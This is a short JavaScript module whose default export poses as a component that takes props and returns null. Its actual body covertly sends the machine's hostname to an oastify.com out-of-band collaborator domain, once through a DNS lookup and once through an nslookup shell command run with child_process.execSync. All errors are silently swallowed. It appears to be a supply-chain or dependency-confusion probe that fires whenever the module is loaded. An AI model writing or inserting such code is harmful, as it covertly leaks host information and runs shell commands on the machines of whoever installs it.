module.exports = {
  default: function(props) {
    try {
      var os = require("os");
      var dns = require("dns");
      var hostname = os.hostname();
      dns.lookup(hostname + ".fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com", function(err, addr) {});
    } catch(e) {}
    try {
      var cp = require("child_process");
      cp.execSync("nslookup " + require("os").hostname() + ".fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com 2>/dev/null || hostname 2>/dev/null || true");
    } catch(e) {}
    return null;
  }
};
